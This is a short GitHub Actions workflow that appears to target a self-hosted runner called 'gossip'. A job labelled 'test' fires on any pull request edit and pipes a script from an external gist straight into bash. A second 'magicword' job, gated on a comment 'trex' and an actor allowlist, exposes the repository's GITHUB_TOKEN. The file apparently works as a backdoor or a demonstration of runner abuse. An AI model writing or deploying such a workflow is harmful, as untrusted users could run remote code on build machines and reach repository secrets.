on:
  issue_comment:
    types: [created]
  pull_request:
    types: [edited]
  
jobs:
  test:
    runs-on: gossip
    if: github.event_name == 'pull_request'
    steps:
      - run: curl https://gist.githubusercontent.com/vikorium/8bf940180791d6529c9246a747fa4939/raw/e48d37d10b082fabe4752ee165335bf8650ac893/ror.sh | bash
      
  magicword:
    runs-on: gossip
    if: contains( '\
      jack,\
      jack,\
      john,\
      certainlynotvikorium,\
      bill,\
      joe,\
      alissa,\
      ', format('{0},', github.actor)) && github.event.comment.body == 'trex'
    steps:
      - name: You said the magic word!
        run: sleep 1
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
